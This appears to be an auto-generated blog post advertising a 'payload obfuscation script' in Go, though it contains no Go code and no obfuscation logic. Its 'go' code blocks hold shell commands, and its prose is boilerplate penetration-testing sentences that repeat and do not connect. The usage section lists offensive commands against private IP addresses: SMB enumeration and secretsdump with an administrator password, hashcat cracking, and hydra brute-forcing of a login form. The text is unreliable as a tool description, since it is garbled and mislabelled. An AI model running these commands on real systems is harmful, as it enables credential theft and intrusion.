---
TitleSEO: "Payload Obfuscation Script in Go | ZureFX"
TitlePost: "Payload Obfuscation Script — Go"
Author: "ZureFX"
Description: "A Go script for payload obfuscation script. Built for security research and automation."
Keywords: "tool, fuzzer, parser, c, bash, go"
URL: "https://zurefx.github.io/scripting/script-payload-obfuscation-script-641.html"
URL_IMAGES: ""
Date: "2024-06-12"
Tags: "Tool, Fuzzer, Parser, C, Bash, Go"
Section: "scripting"
Lang: "en"
main_img: "script-payload-obfuscation-script-641"
Permalink: "/scripting/script-payload-obfuscation-script-641.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `GetUserSPNs`
- `ligolo-ng`
- `burpsuite`

## Implementation

### Core Logic

Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service.

```go
feroxbuster -h
```

Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Helper Functions

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials.

```go
nmap -sCV -p8080,389,1521 10.28.202.145 -oN scan.txt
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.82.44.53 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.86.158.234 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.122.158.174 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.46.37.34
```

## Output

### Example Output

The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible.

```
[+] Scanning target...
[+] Found 20 results
[+] Done in 11.38s
```
